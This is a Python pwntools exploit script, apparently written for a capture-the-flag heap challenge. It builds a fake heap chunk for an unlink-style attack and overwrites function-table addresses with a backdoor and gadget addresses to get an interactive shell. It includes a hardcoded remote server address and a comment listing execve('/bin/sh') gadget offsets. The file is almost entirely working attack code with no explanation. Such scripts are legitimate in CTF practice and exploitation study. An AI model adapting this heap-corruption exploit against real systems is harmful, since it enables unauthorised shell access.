#!/usr/bin/env python
#-*-coding:utf-8-*-

from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)

proc="./pwn"

elf=ELF(proc)

# 0xf < size <= 0x1000
# target = 0x000404080

def add(size,context):
	sh.sendlineafter("> ","1")
	sh.sendline(str(size))
	sh.sendline(context)

def free(index):
	sh.sendlineafter("> ","2")
	sh.sendline(str(index))

def pwn(ip,port,debug):
	global sh
	if debug==1:
		context.log_level="debug"
		sh=process(proc)
	else:
		context.log_level="debug"
		sh=remote(ip,port)
		
		

	target = 0x404018
	backdoor = 0x401473
	ptr = 0x4040d0
	# free proint 
	# gdb.attach(sh,"b *0x00000000004013FD ")
	# malloc proint
	
	for i in range(1,8):
		add(i*0x10,"AAA") 
	#gdb.attach(sh)
	fd = target - 0x18
	bk = target - 0x10
	fake_chunk = p64(0)+p64(0x81)+p64(fd)+p64(bk)+"A"*0x60+p64(0x80)
	add(0x1000,fake_chunk)
	free(0x260)

	
	add(0x1000,p64(0)+p64(0x31)+p64(target))
	# gdb.attach(sh,"b *0x0000401387 ")
	#add(0x1000,p64(0)+p64(0x61)+p64(target))
	add(0x70,"f0und")
	
	add(0x1000,p64(0)+p64(0x41)+p64(0x404058))
	add(0x20,"f0und")
	add(0x1000,p64(0)+p64(0x51)+p64(target))
	add(0x30,"f0und")
	
	
	add(0x70,p64(0x401473)+p64(0x401543)*4+"\x84\x5c")
	gdb.attach(sh,"b *0x4013a8 ")
	add(0x20,p64(0x40150f))
	sh.interactive()

if __name__ =="__main__":
	while 1:
		pwn("119.23.255.127",48948,1)
	
"""
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
  
  0x7f71e1469c7e
  0x7f71e1469c81
0x7f71e1469c84
"""